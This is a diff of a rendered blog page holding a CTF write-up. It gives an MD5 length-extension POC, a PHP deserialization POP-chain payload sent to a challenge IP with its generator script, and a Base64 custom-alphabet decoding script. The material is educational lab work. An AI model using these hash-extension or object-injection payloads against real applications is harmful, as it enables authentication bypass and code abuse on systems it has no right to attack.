@@ -480,14 +480,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    485
+                    512
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    3 分
                 </div>
                 
 
@@ -502,8 +502,7 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>#BabyMd5</p>
-<p><a target="_blank" rel="noopener" href="http://ip:50197/source.txt">http://IP:50197/source.txt</a></p>
+                <h1 id="BabyMd5"><a href="#BabyMd5" class="headerlink" title="BabyMd5"></a>BabyMd5</h1><p><a target="_blank" rel="noopener" href="http://ip:50197/source.txt">http://IP:50197/source.txt</a></p>
 <pre><code>&lt;?php
 if(!isset($_POST[&quot;username&quot;]) || !isset($_POST[&quot;password&quot;]))&#123;
     exit();
@@ -530,26 +529,81 @@ if (!empty($_COOKIE[&quot;check&quot;])) &#123;
 
 setcookie(&quot;ahash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));
 ?&gt;</code></pre>
-<p>##POC<br>username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%a0%00%00%00%00%00%00%00xxx</p>
-<p>#反序列化</p>
-<p><a target="_blank" rel="noopener" href="http://183.196.135.117:50957/?a=O:4:%22TOPC%22:2:%7Bs:3:%22obj%22;N;s:4:%22attr%22;O:4:%22TOPB%22:2:%7Bs:3:%22obj%22;N;s:4:%22attr%22;s:127:%22O:4:%22TOPA%22:4:%7Bs:5:%22token%22;N;s:6:%22ticket%22;R:2;s:8:%22username%22;s:17:%22aaaaaaaaaaaaaaaaa%22;s:8:%22password%22;s:18:%22bbbbbbbbbbbbbbbbbb%22;%7D%22;%7D%7D">http://183.196.135.117:50957/?a=O:4:%22TOPC%22:2:{s:3:%22obj%22;N;s:4:%22attr%22;O:4:%22TOPB%22:2:{s:3:%22obj%22;N;s:4:%22attr%22;s:127:%22O:4:%22TOPA%22:4:{s:5:%22token%22;N;s:6:%22ticket%22;R:2;s:8:%22username%22;s:17:%22aaaaaaaaaaaaaaaaa%22;s:8:%22password%22;s:18:%22bbbbbbbbbbbbbbbbbb%22;}%22;}}</a></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%a0%00%00%00%00%00%00%00xxx</p>
+<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p><a target="_blank" rel="noopener" href="http://183.196.135.117:50957/?a=O:4:%22TOPC%22:2:%7Bs:3:%22obj%22;N;s:4:%22attr%22;O:4:%22TOPB%22:2:%7Bs:3:%22obj%22;N;s:4:%22attr%22;s:127:%22O:4:%22TOPA%22:4:%7Bs:5:%22token%22;N;s:6:%22ticket%22;R:2;s:8:%22username%22;s:17:%22aaaaaaaaaaaaaaaaa%22;s:8:%22password%22;s:18:%22bbbbbbbbbbbbbbbbbb%22;%7D%22;%7D%7D">http://183.196.135.117:50957/?a=O:4:%22TOPC%22:2:{s:3:%22obj%22;N;s:4:%22attr%22;O:4:%22TOPB%22:2:{s:3:%22obj%22;N;s:4:%22attr%22;s:127:%22O:4:%22TOPA%22:4:{s:5:%22token%22;N;s:6:%22ticket%22;R:2;s:8:%22username%22;s:17:%22aaaaaaaaaaaaaaaaa%22;s:8:%22password%22;s:18:%22bbbbbbbbbbbbbbbbbb%22;}%22;}}</a></p>
 <p>pop链是C-&gt;echo-&gt;B-&gt;tostring</p>
-<p>&lt;?php</p>
-<p>class TOPA{<br>    public $token;<br>    public $ticket;<br>    public $username;<br>    public $password;<br>    function __construct(){<br>        $this-&gt;ticket = &amp;$this-&gt;token;<br>    }<br>}</p>
-<p>class TOPB{<br>    public $obj;<br>    public $attr;<br>    function __construct($a){<br>            $this-&gt;attr = $a;<br>    }<br>}</p>
-<p>class TOPC{<br>    public $obj;<br>    public $attr;</p>
-<pre><code>function __construct($a)&#123;
-    $this-&gt;attr = $a;
-&#125;</code></pre>
-<p>}</p>
-<p>$a = new TOPA();<br>$ser_a = serialize($a);<br>$b = new TOPB($ser_a);<br>$c = new TOPC($b);<br>$ser_c = serialize($c);<br>echo($ser_c);</p>
-<p>通过&amp;来取址赋值</p>
-<p>#MT—SEED</p>
-<p>#bas<br>Base64换表</p>
-<p>import base64</p>
-<p>m = ‘’’They camefirst for the Communists,<br>and I didn’t speak upbecause I wasn’t a Communist.<br>Then they came for the Jews,<br>and I didn’t speak upbecause I wasn’t a Jew.<br>Then they came for the trade unionists,<br>and I didn’t speak upbecause I wasn’t a trade unionist.<br>Then they came for the Catholics,<br>and I didn’t speak upbecause I was a Protestant.<br>Then they came for me,<br>but by that timeno one was left to speak up.’’’.encode()</p>
-<p>s1 = base64.b64encode(m).decode()<br>s2 = “ETsovHYqBD8oAnobx6JtAn0bRSIlAHYWy78gwD4kx6IaOZksynJtHHYpzDIfQ6Jtx6YoBDhtwCYrADMswCMoRVptw7Uayrw9RTVtJ70gyCEfzCM9OtkFzTEfRSIlACptB7UgAHYny6RtwTsoRVkow6NhXnUfAXYQRTIkAT5mwXYaxTEszbY8xTQoB7U8x7FtHHY6BCMfQ6JtBHYPACxfXoIlAD5twTsovHYqBD8oRTAexrY9zTFtwSQsATFtwD4ky74kx6IaOZksynJtHHYpzDIfQ6Jtx6YoBDhtwCYrADMswCMoRVptw7Uayrw9RTVtwSQsATFtwD4ky74kx6JfXoIlAD5twTsovHYqBD8oRTAexrY9zTFtJ7U9zT0hzDMaOZksynJtHHYpzDIfQ6Jtx6YoBDhtwCYrADMswCMoRVptw7UaRTVtFSQewTEawTUfwX5PETsoyrY9zTE4RTMsyDFtAn0bRT8oOZkrwCJtBmptwTsswXY9zD8oyn1ty74oRSwsxbYhADA9RSIeRSMdADUiRSEdOt==”<br>chargeList = []<br>for i in range(len(s1)):<br>    tmp1 = [s1[i], s2[i]]<br>    tmp2 = [s2[i], s1[i]]<br>    if tmp1 not in chargeList and tmp2 not in chargeList:<br>        chargeList.append(tmp1)<br>        chargeList.append(tmp2)<br>print(chargeList, len(chargeList))</p>
-<p>flag_enc = “AncsA6gsATN7LDAqBGZdMTFbAWAoNapcAqAsBqwoMqtaMnFdMC9”<br>flag = “”<br>for i in flag_enc:<br>    for j in chargeList:<br>        if j[1] == i:<br>            flag += j[0]<br>print(flag)<br>print(base64.b64decode(flag + “==”))</p>
+<pre><code>&lt;?php
+
+class TOPA&#123;
+    public $token;
+    public $ticket;
+    public $username;
+    public $password;
+    function __construct()&#123;
+        $this-&gt;ticket = &amp;$this-&gt;token;
+    &#125;
+&#125;
+
+class TOPB&#123;
+    public $obj;
+    public $attr;
+    function __construct($a)&#123;
+            $this-&gt;attr = $a;
+    &#125;
+&#125;
+
+class TOPC&#123;
+    public $obj;
+    public $attr;
+
+    function __construct($a)&#123;
+        $this-&gt;attr = $a;
+    &#125;
+&#125;
+
+$a = new TOPA();
+$ser_a = serialize($a);
+$b = new TOPB($ser_a);
+$c = new TOPC($b);
+$ser_c = serialize($c);
+echo($ser_c);
+
+通过&amp;来取址赋值</code></pre>
+<h1 id="bas"><a href="#bas" class="headerlink" title="bas"></a>bas</h1><h2 id="Base64换表"><a href="#Base64换表" class="headerlink" title="Base64换表"></a>Base64换表</h2><pre><code>import base64
+
+m = &#39;&#39;&#39;They camefirst for the Communists,
+and I didn&#39;t speak upbecause I wasn&#39;t a Communist.
+Then they came for the Jews,
+and I didn&#39;t speak upbecause I wasn&#39;t a Jew.
+Then they came for the trade unionists,
+and I didn&#39;t speak upbecause I wasn&#39;t a trade unionist.
+Then they came for the Catholics,
+and I didn&#39;t speak upbecause I was a Protestant.
+Then they came for me,
+but by that timeno one was left to speak up.&#39;&#39;&#39;.encode()
+
+
+s1 = base64.b64encode(m).decode()
+s2 = &quot;ETsovHYqBD8oAnobx6JtAn0bRSIlAHYWy78gwD4kx6IaOZksynJtHHYpzDIfQ6Jtx6YoBDhtwCYrADMswCMoRVptw7Uayrw9RTVtJ70gyCEfzCM9OtkFzTEfRSIlACptB7UgAHYny6RtwTsoRVkow6NhXnUfAXYQRTIkAT5mwXYaxTEszbY8xTQoB7U8x7FtHHY6BCMfQ6JtBHYPACxfXoIlAD5twTsovHYqBD8oRTAexrY9zTFtwSQsATFtwD4ky74kx6IaOZksynJtHHYpzDIfQ6Jtx6YoBDhtwCYrADMswCMoRVptw7Uayrw9RTVtwSQsATFtwD4ky74kx6JfXoIlAD5twTsovHYqBD8oRTAexrY9zTFtJ7U9zT0hzDMaOZksynJtHHYpzDIfQ6Jtx6YoBDhtwCYrADMswCMoRVptw7UaRTVtFSQewTEawTUfwX5PETsoyrY9zTE4RTMsyDFtAn0bRT8oOZkrwCJtBmptwTsswXY9zD8oyn1ty74oRSwsxbYhADA9RSIeRSMdADUiRSEdOt==&quot;
+chargeList = []
+for i in range(len(s1)):
+    tmp1 = [s1[i], s2[i]]
+    tmp2 = [s2[i], s1[i]]
+    if tmp1 not in chargeList and tmp2 not in chargeList:
+        chargeList.append(tmp1)
+        chargeList.append(tmp2)
+print(chargeList, len(chargeList))
+
+
+flag_enc = &quot;AncsA6gsATN7LDAqBGZdMTFbAWAoNapcAqAsBqwoMqtaMnFdMC9&quot;
+flag = &quot;&quot;
+for i in flag_enc:
+    for j in chargeList:
+        if j[1] == i:
+            flag += j[0]
+print(flag)
+print(base64.b64decode(flag + &quot;==&quot;))
+</code></pre>
 
             </div>
             <hr/>
@@ -808,7 +862,7 @@ setcookie(&quot;ahash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;a
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Augu5t
+                            augu5t
                             
                         </span>
                     </div>
